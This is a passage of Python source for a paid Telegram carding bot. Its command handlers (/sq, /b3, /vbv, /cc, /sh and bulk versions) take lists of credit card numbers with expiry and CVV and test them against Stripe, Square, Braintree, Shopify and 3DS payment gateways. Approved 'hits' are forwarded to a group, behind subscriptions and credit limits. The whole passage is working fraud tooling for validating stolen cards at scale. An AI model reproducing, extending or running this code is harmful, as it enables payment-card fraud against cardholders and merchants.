                response = format_single_response(result, user_full_name, processing_time)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=response, parse_mode='HTML')
                if result['status'] == 'APPROVED':
                    bot.send_message(HITS_GROUP_ID, response, parse_mode='HTML')
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=f"❌ Error: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mst'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mst'))
def handle_mst(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command only works in group or if subscribed.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ Checker is offline. Follow @spydil.")
        return

    if not is_user_subscribed(message.from_user.id):
        return bot.reply_to(message, "❌ Only for subscribed users.")

    if not check_mass_check_cooldown(message.from_user.id):
        return bot.reply_to(message, "⚠️ Slow down! Wait before next mass check.")

    try:
        raw_text = None
        if len(message.text.split()) > 1:
            raw_text = message.text.split(' ', 1)[1]
        elif message.reply_to_message:
            raw_text = message.reply_to_message.text

        if not raw_text:
            return bot.reply_to(message, "❌ No cards provided. Paste or reply to card list.")

        cards = list(set(re.findall(r"\d{12,19}[\|:\/ ]\d{1,2}[\|:\/ ]\d{2,4}[\|:\/ ]\d{3,4}", raw_text)))
        limit = MAX_SUBSCRIBED_CARDS_LIMIT
        cards = cards[:limit]

        if not cards:
            return bot.reply_to(message, "❌ No valid cards found.")

        start_time = time.time()
        user_full_name = message.from_user.first_name + (f" {message.from_user.last_name}" if message.from_user.last_name else "")
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')

        def check_cards():
            results = []
            for i, card in enumerate(cards, 1):
                try:
                    result = check_st_cc(card)
                    result['user_id'] = message.from_user.id
                    results.append(result)
                    if result['status'] == 'APPROVED':
                        bot.send_message(HITS_GROUP_ID, f"✅ HIT via /mst:\n<code>{result['card']}</code>", parse_mode='HTML')
                except Exception as e:
                    results.append({'status': 'ERROR', 'card': card, 'message': str(e), 'brand': 'UNKNOWN', 'country': 'UNKNOWN 🌐', 'type': 'UNKNOWN', 'gateway': 'Stripe [5$]'})

                response_text = format_mchk_response(results, len(cards), time.time() - start_time, i)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=response_text, parse_mode='HTML')

        threading.Thread(target=check_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /sq and .sq
@bot.message_handler(commands=['sq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sq'))
def handle_sq(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from input
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sq CC|MM|YYYY|CVV or .sq CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:
            cc = message.text[4:].strip()  # remove ".sq "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Square [0.20$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_square_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send to hits group if approved
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /msq and .msq
@bot.message_handler(commands=['msq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msq'))
def handle_msq(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_square_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Square [0.20$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle both /b3 and .b3
@bot.message_handler(commands=['b3'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.b3'))
def handle_b3(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /b3 CC|MM|YYYY|CVV or .b3 CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Braintree Premium Auth </i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_b3_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mb3 and .mb3
@bot.message_handler(commands=['mb3'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mb3'))
def handle_mb3(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_b3_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Braintree Auth'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['vbv'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.vbv') or m.text.lower().startswith('vbv ')))
def handle_vbv(message):
    # ─── Permissions & Flood & Date Check ─────────────────────
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "This bot is restricted in DMs. Use it in @voidxup or subscribe.")
        return

    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "This group is not approved.")
        return

    if not confirm_time():
        bot.reply_to(message, "The checker is dead now, follow @spydil for more!!")
        return

    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "Please wait 5 seconds between commands.")
        return

    # ─── Get the card ───────────────────────────────────────
    try:
        if message.text.startswith('/vbv') or message.text.lower().startswith('vbv '):
            # /vbv 4111... or vbv 4111...
            args = message.text.split(maxsplit=1)
            if len(args) < 2 and message.reply_to_message:
                cc = message.reply_to_message.text.strip()
            elif len(args) < 2:
                bot.reply_to(message, "Send card after command or reply to a card.")
                return
            else:
                cc = args[1]
        else:
            # .vbv 4111...
            cc = message.text[4:].strip() if message.text.startswith('.vbv') else message.text[5:].strip()

        if not cc or '|' not in cc:
            bot.reply_to(message, "Invalid card format.")
            return

    except Exception as e:
        bot.reply_to(message, f"Error reading card: {e}")
        return

    # ─── User name ───────────────────────────────────────────
    user_full_name = message.from_user.first_name
    if message.from_user.last_name:
        user_full_name += " " + message.from_user.last_name

    # ─── Send "Checking..." message ───────────────────────────
    status_msg = bot.reply_to(
        message,
        f"Checking VBV...\n\n"
        f"Card ➜ <code>{cc}</code>\n"
        f"Gateway ➜ <i>VoidAPI v2</i>\n"
        f"Status ➜ <i>Processing...</i>",
        parse_mode='HTML'
    )

    # ─── Thread (everything defined inside → no scope errors) ─────
    def check_card():
        start_time = time.time()        # ← defined inside thread = safe
        try:
            result = check_vbv_cc(cc)
            result['user_id'] = message.from_user.id   # for Owner/Premium tag

            processing_time = time.time() - start_time

            response_text = format_vbv_response(result, user_full_name, processing_time)

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=response_text,
                parse_mode='HTML'
            )

            # Auto forward LIVE & CHALLENGE
            if result.get('status') in ['LIVE', 'CHALLENGE']:
                try:
                    bot.send_message(HITS_GROUP_ID, response_text, parse_mode='HTML')
                except:
                    pass

        except Exception as e:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"Checker crashed:\n<code>{str(e)}</code>",
                parse_mode='HTML'
            )

    threading.Thread(target=check_card, daemon=True).start()

# Handle both /mvbv and .mvbv
@bot.message_handler(commands=['mvbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mvbv'))
def handle_mvbv(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_VBV_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_vbv_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': '3DS Lookup'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle both /cc and .cc
@bot.message_handler(commands=['cc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.cc'))
def handle_cc(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /cc CC|MM|YYYY|CVV or .cc CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Site Based [1$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_cc_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /cc] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mcc and .mcc
@bot.message_handler(commands=['mcc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mcc'))
def handle_mcc(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_cc_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Site Based [1$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle both /sh and .sh
@bot.message_handler(commands=['sh'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sh'))
def handle_sh(message):
    # Access control
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Flood control
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Credit check
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sh CC|MM|YYYY|CVV or .sh CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:
            cc = message.text[4:].strip()  # remove ".sh "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Shopify [1$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_shopify_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time

                # Enforce 10s delay
                if processing_time < 10:
                    time.sleep(10 - processing_time)
                    processing_time = 10

                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - sh] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /msh and .msh
@bot.message_handler(commands=['msh'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msh'))
def handle_msh(message):
